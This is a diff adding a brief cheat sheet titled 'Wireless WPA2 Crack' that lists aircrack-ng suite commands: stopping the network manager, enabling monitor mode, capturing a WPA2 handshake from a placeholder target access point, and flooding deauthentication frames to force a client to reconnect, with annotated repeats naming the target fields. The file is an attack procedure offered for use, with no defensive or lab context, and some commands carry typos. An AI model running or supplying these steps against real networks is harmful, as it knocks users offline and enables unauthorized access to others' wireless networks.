@@ -1,0 +1,30 @@
+Wireless WPA2 Crack
+
+service network-manager stop
+airmon-ng startwlan0
+airodump-ng --bssid "00:00:00:00:00" --channel "1" --write "test-handshake" wlan0mon
+aireplay-ng --deauth 4 -a "00:00:00:00:00" -c "00:00:00:00:00" wlan0mon
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		"target bssid"     "target channel" "filename to write"
+airodump-ng --bssid 00:00:00:00:00 -channel 1 --write test-handshake wlan0mon
+
+                          "target AP"        "client"
+aireplay-ng --deauth 4 -a 00:00:00:00:00 -c 00:00:00:00:00 wlan0mon
